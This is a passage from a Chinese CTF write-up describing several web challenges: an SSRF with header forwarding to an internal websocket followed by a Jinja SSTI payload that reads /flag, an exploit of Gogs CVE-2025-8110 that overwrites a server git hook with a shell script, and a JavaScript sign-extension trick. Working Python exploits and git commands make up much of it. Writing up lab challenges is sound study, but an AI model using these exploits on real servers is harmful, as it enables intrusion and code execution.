class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Debug Config&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;operationId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;debug_config_api_debug_config_get&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Successful Response&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;application/json&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;/redirect_ws&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;get&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;summary&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Redirect Ws&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;operationId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;redirect_ws_redirect_ws_get&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;responses&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;200&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Successful Response&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;application/json&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;schema&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8001/redirect_ws">http://127.0.0.1:8001/redirect_ws</a>   </p>
<p>返回 <strong>302 Redirect  到  ws协议访问的9000端口</strong>，并在 <code>Location</code> 头中泄露了动态生成的   token   MD5 令牌。 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NGI2OWIzZmM2Y2Q5ZjMxMGE3M2I0MWQwNmIzOTEyZTlfMHBoY2x0dEhkT1V2MEdzN2paMHl0dkJiRXVNMG9wUVVfVG9rZW46U3FBdWIza1VBbzRwa2N4MXdFYmNwRm10blJnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>ws:&#x2F;&#x2F;127.0.0.1:9000&#x2F;ws  显示需要token</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTQ5Yjc0YjdlZTc3NTgzOWIzMWJkZDU0ZTU1ZDA5M2ZfQlFhMVduSVExdmpyam84QmJma25sWVJKWjlpbjFxVlZfVG9rZW46Q2g5NWIzSmxVb2ZNbTZ4Q2ZyYWNGTjBmbnZiXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>ws:&#x2F;&#x2F;127.0.0.1:9000&#x2F;ws?token&#x3D;刚刚看到的动态令牌</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YTU5NzZmZjY1NDdiOTZiY2YyNzU1ZTU3YjVhN2Y3MjRfTU5yZFpqSUFWQkYzUGRZQTJOeGtBcTlDelhkSndqTmhfVG9rZW46TU40T2J2bXFpbzBQZnB4RUgxTWNmaUVhbkFjXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>报错 <code>invalid origin &#39;None&#39;</code>，提示 <code>X-Internal-Token header must match ?token</code>。</p>
<p>后端验证了 HTTP 请求头中的 <code>Origin</code> 和自定义头 <code>X-Internal-Token</code></p>
<p>探测发现 <code>/fetch</code> 接口存在 <strong>Header Propagation (请求头转发)</strong> 漏洞。即当外部请求 80 端口时带上的 Header，会被后端 <code>/fetch</code> 逻辑转发给内网目标。</p>
<p>Exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://80-be076729-35c0-41f8-88b7-3e5239446097.challenge.ctfplus.cn&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn_header_forwarding</span>():</span><br><span class="line">    <span class="comment"># 1. 抓取管理员令牌</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 正在获取令牌...&quot;</span>)</span><br><span class="line">    r_token = requests.get(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/fetch&quot;</span>, params=&#123;<span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;http://127.0.0.1:8001/redirect_ws?token=ws_adm1nr&quot;</span>&#125;)</span><br><span class="line">    token = r_token.json()[<span class="string">&#x27;history&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;location&#x27;</span>].split(<span class="string">&quot;token=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 动态令牌: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 构造发往 80 端口的 Header</span></span><br><span class="line">    <span class="comment"># 如果 /fetch 是透明转发，这些 Header 会被带到 9000 端口</span></span><br><span class="line">    custom_headers = &#123;</span><br><span class="line">        <span class="string">&quot;X-Internal-Token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://127.0.0.1&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ws_url = <span class="string">f&quot;ws://127.0.0.1:9000/ws?token=<span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 尝试通过 Header 转发攻击...&quot;</span>)</span><br><span class="line">    <span class="comment"># 注意：这里的 headers 是发给 TARGET_URL (80端口) 的</span></span><br><span class="line">    r = requests.get(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/fetch&quot;</span>, params=&#123;<span class="string">&quot;url&quot;</span>: ws_url&#125;, headers=custom_headers)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;响应结果: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> r.text.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n🏆🏆🏆 FLAG FOUND! 🏆🏆🏆&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn_header_forwarding()</span><br><span class="line">响应结果: &#123;<span class="string">&quot;ws&quot;</span>:<span class="string">&quot;ok&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;handshake success&quot;</span>,<span class="string">&quot;welcome&quot;</span>:<span class="string">&quot;&#123;\&quot;service\&quot;:\&quot;IntraSight Template Preview\&quot;,\&quot;version\&quot;:\&quot;1.0\&quot;,\&quot;protocol\&quot;:&#123;\&quot;action\&quot;:\&quot;render\&quot;,\&quot;template\&quot;:\&quot;&lt;template string&gt;\&quot;,\&quot;context\&quot;:&#123;\&quot;optional\&quot;:\&quot;variables\&quot;&#125;&#125;&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>SSTI注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;action&quot;: &quot;render&quot;,</span><br><span class="line">    &quot;template&quot;: &quot;你的模板代码&quot;,</span><br><span class="line">    &quot;context&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">&#123;&quot;action&quot;: &quot;render&quot;, &quot;template&quot;: &quot;&#123;&#123;lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;&quot;, &quot;context&quot;: &#123;&#125;&#125;</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">TARGET_URL = &quot;http://80-be076729-35c0-41f8-88b7-3e5239446097.challenge.ctfplus.cn&quot;</span><br><span class="line"></span><br><span class="line">def pwn_ssti():</span><br><span class="line">    # 1. 获取最新令牌 (用管理员 Key)</span><br><span class="line">    r_token = requests.get(f&quot;&#123;TARGET_URL&#125;/fetch&quot;, params=&#123;&#x27;url&#x27;: &quot;http://127.0.0.1:8001/redirect_ws?token=ws_adm1nr&quot;&#125;)</span><br><span class="line">    token = r_token.json()[&#x27;history&#x27;][0][&#x27;location&#x27;].split(&quot;token=&quot;)[1]</span><br><span class="line">    print(f&quot;[*] 使用新令牌: &#123;token&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 2.SSTI</span><br><span class="line">    payloads = [</span><br><span class="line">        &#123;&quot;action&quot;: &quot;render&quot;, &quot;template&quot;: &quot;&#123;&#123;lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;&quot;, &quot;context&quot;: &#123;&#125;&#125;,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    custom_headers = &#123;</span><br><span class="line">        &quot;X-Internal-Token&quot;: token,</span><br><span class="line">        &quot;Origin&quot;: &quot;http://127.0.0.1&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ws_url = f&quot;ws://127.0.0.1:9000/ws?token=&#123;token&#125;&quot;</span><br><span class="line"></span><br><span class="line">    for p in payloads:</span><br><span class="line">        print(f&quot;\n[&gt;] 发送 Payload: &#123;p[&#x27;template&#x27;]&#125;&quot;)</span><br><span class="line">        # 混合攻击：Header 转发 + POST Body 注入</span><br><span class="line">        r = requests.post(</span><br><span class="line">            f&quot;&#123;TARGET_URL&#125;/fetch&quot;,</span><br><span class="line">            params=&#123;&quot;url&quot;: ws_url&#125;,</span><br><span class="line">            headers=custom_headers,</span><br><span class="line">            json=p</span><br><span class="line">        )</span><br><span class="line">        print(f&quot;响应: &#123;r.text&#125;&quot;)</span><br><span class="line">        if &quot;49&quot; in r.text or &quot;flag&#123;&quot; in r.text.lower():</span><br><span class="line">            print(&quot;\n🏆 BINGO!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    pwn_ssti()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTI0ZGZjYjVlMTIzMmMyNDhkYzBhZDVmYjYzMGUzMzVfdERLUEhQQU1GMHl2Q2NqbXlkQW9uVWFpd1FkaU53VWdfVG9rZW46UVBLbmJ6SWRXbzVjNHJ4d3dDQmNoZjJablpkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="gogogos"><a href="#gogogos" class="headerlink" title="gogogos"></a>gogogos</h3><p><strong>CVE-2025-8110</strong>（任意文件写入漏洞）结合 <strong>Git 钩子机制</strong></p>
<p>Gogs 的 API 接口（<code>PUT /repos/.../contents/...</code>）在修改文件内容时，没有检查目标文件是否为<strong>符号链接（Symlink）</strong>。</p>
<p>注册账户</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OGFlZmUxNmM1YzY3OTE3MjY3OTQyN2U5ZTg4YjUyYjZfSDBOQ2RIcXlGVmwwQk1GYWxHSXpjZnpyU3VaNkVtZjZfVG9rZW46VVU0YWJrTnBNb0EwcmN4MGV1WmN3RTAybm0zXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>创建仓库</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTVlNzBkNzk0NDhjODFjODY2Yjc5N2U2OWE5OTQxYmNfWENnaHh1eFdqODAwZ1ZSMmNWbnd5UE5OcE9QY2VNV1JfVG9rZW46VG9XOWJJenpxb2NaZHl4MHFQTmN0NUZrbnloXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzZmMDY4ZTczZjQwNzM4MTRkMGQ4OGE0ZGRkNjQ5MGJfenVtaEFlSDdLanpyRTEyODMxVWFnWVJibWZDdEVRVnRfVG9rZW46Q1BRamJIczBPb3BSSTN4Z0ZWZGNJYTlRbmpmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>在本地创建一个恶意 Git 仓库，并添加一个指向服务器 Git 钩子路径的符号链接。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 1. 初始化 Git 仓库</span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"># 关联远程仓库 (注意替换 URL 中的 IP 为你最新的容器 IP)</span><br><span class="line"># 你的 IP 是 3000-031286bf...</span><br><span class="line">git remote add origin http://3000-031286bf-0404-4224-8ad2-5f5cdf220372.challenge.ctfplus.cn/dada/aaa.git</span><br><span class="line"># 2. 配置 Git 身份（CTF里随便填，必须配置才能提交） </span><br><span class="line">git config --global user.email &quot;hacker@ctf.com&quot; </span><br><span class="line">git config --global user.name &quot;hacker&quot;</span><br><span class="line"># 3. 创建软链接</span><br><span class="line">ln -s /data/git/gogs-repositories/dada/aaa.git/hooks/post-receive pwn_hook</span><br><span class="line"></span><br><span class="line"># 4. 提交并推送</span><br><span class="line">git add pwn_hook</span><br><span class="line">git commit -m &quot;link to hook&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>

<p>输入用户名和密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NjVkNGNkYTE3MjZmM2U1MDhmY2M0ZmNhZTllMmQ3ZGVfczl0VFVwMTFyQXBaNFdIS2JuNzdGU1VXVGR1cXhGbm5fVG9rZW46WDVsUWJFek5pb2F3NW94c1JaT2N3VTdUbk1jXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>去查看仓库可以看到已经push成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTM3N2E2OGQzMjJiNGQ2ZDVmNjFjNzUwN2U2NjVhNWNfSUhyS0lnNU56aThSSnA4Um5lUldMcGYwdE5TRVY2UGtfVG9rZW46RVplZWIzM0Fmb1JxY3p4b3FlN2NaTUZZbnNkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>利用 API 通过这个软链接把恶意的 Shell 脚本写入服务器的钩子文件中，然后再次 Push 触发它来拿 Flag。</p>
<p>授权应用生成令牌token</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MGJhNmJkYTdiNzhiMDc3YmEwN2E1NDU3YTgzN2FhMzZfWElhdkNKZG9XemtwckdpR20wVnBtQVhQYUpJNmRQMzBfVG9rZW46WVVpRmJoUGtQb05IMUx4eDNBVGNZb3ZVbk5nXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># ================= 配置区域 =================</span><br><span class="line">BASE_URL = &quot;http://3000-031286bf-0404-4224-8ad2-5f5cdf220372.challenge.ctfplus.cn&quot;</span><br><span class="line">USERNAME = &quot;dada&quot;</span><br><span class="line">REPO_NAME = &quot;aaa&quot;</span><br><span class="line">FILE_PATH = &quot;pwn_hook&quot;  # 刚才推送成功的软链接</span><br><span class="line"></span><br><span class="line"># 【请在这里填入 Token】(如果环境重置了，去网页重新生成一个)</span><br><span class="line">TOKEN = &quot;b5591ab17b6ae539305de45adf8d346d934e1c16&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 【修改点】恶意脚本：改为搜索 flag 文件和列出根目录</span><br><span class="line"># find 命令会查找所有名字包含 flag 的文件</span><br><span class="line">HOOK_SCRIPT = &quot;&quot;&quot;#!/bin/sh</span><br><span class="line">echo &quot;================SEARCHING================&quot;</span><br><span class="line">echo &quot;[*] Listing root directory:&quot;</span><br><span class="line">ls -al /</span><br><span class="line">echo &quot;[*] Searching for *flag* in filesystem:&quot;</span><br><span class="line">find / -name &quot;*flag*&quot; 2&gt;/dev/null</span><br><span class="line">echo &quot;[*] Checking environment variables:&quot;</span><br><span class="line">env</span><br><span class="line">echo &quot;=========================================&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================</span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    api_url = f&quot;&#123;BASE_URL&#125;/api/v1/repos/&#123;USERNAME&#125;/&#123;REPO_NAME&#125;/contents/&#123;FILE_PATH&#125;&quot;</span><br><span class="line">    headers = &#123;&quot;Authorization&quot;: f&quot;token &#123;TOKEN&#125;&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line"></span><br><span class="line">    print(&quot;[*] 正在获取当前 Hook 的 SHA...&quot;)</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(api_url, headers=headers)</span><br><span class="line">        if r.status_code != 200:</span><br><span class="line">            print(f&quot;[-] 获取失败: &#123;r.status_code&#125;&quot;)</span><br><span class="line">            return</span><br><span class="line">        sha = r.json().get(&#x27;sha&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;[-] 错误: &#123;e&#125;&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    print(&quot;[*] 正在更新恶意 Hook 脚本...&quot;)</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;message&quot;: &quot;update hook to search flag&quot;,</span><br><span class="line">        &quot;content&quot;: base64.b64encode(HOOK_SCRIPT.encode()).decode(),</span><br><span class="line">        &quot;sha&quot;: sha,</span><br><span class="line">        &quot;branch&quot;: &quot;master&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.put(api_url, json=data, headers=headers)</span><br><span class="line">    if r.status_code in [200, 201]:</span><br><span class="line">        print(&quot;[+] Hook 更新成功！请再次执行 git push 触发。&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;[-] 更新失败: &#123;r.status_code&#125; &#123;r.text&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NmI5YjIyYjY4MzM1ZTI1Yjc3ZWM5YmQzMWY2OTc3NTFfWlhtV0NMd3BINkE0OWs2M2NXS0RxV0NjY1FYeTNrSFhfVG9rZW46Unk0UWJ3NTBzb0ptQTF4VzZlUmM2cE1OblZmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">去终端</span><br><span class="line"># 1. 制造一个空提交（强制产生变更记录）</span><br><span class="line">git commit --allow-empty -m &quot;trigger exploit&quot;</span><br><span class="line"></span><br><span class="line"># 2. 再次推送（这一次会真正把数据发过去，并触发钩子）</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmE0MjQ0MmExNTY2ZjU0MWRkNjI0YTk3YTlhMGNmMTdfOVZzYmZacElEWE1rUWdTc252ekVLOHhnWXlweUw2V0pfVG9rZW46QUYxUGJhb1Vub3J6Vjl4R0lWdmM3cHAwbkNnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<h3 id="Bytecode-Compiler"><a href="#Bytecode-Compiler" class="headerlink" title="Bytecode Compiler"></a>Bytecode Compiler</h3><p>分析 <code>bundle.js</code> 的 <code>buildPacket</code> 函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MzQ3MDZkOTllOTE1MGRmOThjNjk1ZTI5MTUwYmYzOGNfRGhUNldlR3lXV2V5eXRaM2JVSWZoOXNSUHRNUTlrWkJfVG9rZW46RHNaTmIwM3hpb2RUcXJ4ZWJGY2NoUmE3bnhjXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>利用 <strong>整数溢出&#x2F;符号扩展 (Sign Extension)</strong> 漏洞。</p>
<ol>
<li>将数据包头部的 <code>flags</code> 设置为 <strong><code>255</code></strong> (<code>0xFF</code>)。</li>
<li>JS 引擎执行 <code>(255 &lt;&lt; 24) &gt;&gt; 24</code>，结果变为 <strong><code>-1</code></strong>。</li>
<li>这会导致指令分发逻辑计算出错误的索引：<code>((-1) | 0) % 4 = 3</code>。</li>
<li><strong>Index 3</strong> 是隐藏指令，用于返回 Token。</li>
</ol>
